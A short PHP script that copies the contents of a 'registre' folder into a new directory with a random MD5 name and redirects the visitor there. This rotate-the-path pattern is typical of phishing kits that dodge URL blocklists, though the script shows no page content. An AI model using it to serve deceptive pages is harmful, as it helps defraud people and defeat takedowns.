<?
$DIR=md5(rand(0,100000000000));
function recurse_copy($registre,$DIR) {
$dir = opendir($registre);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($registre . '/' . $file) ) {
recurse_copy($registre . '/' . $file,$DIR . '/' . $file);
}
else {
copy($registre . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$registre="registre";
recurse_copy( $registre, $DIR );
header("location:$DIR");
?> 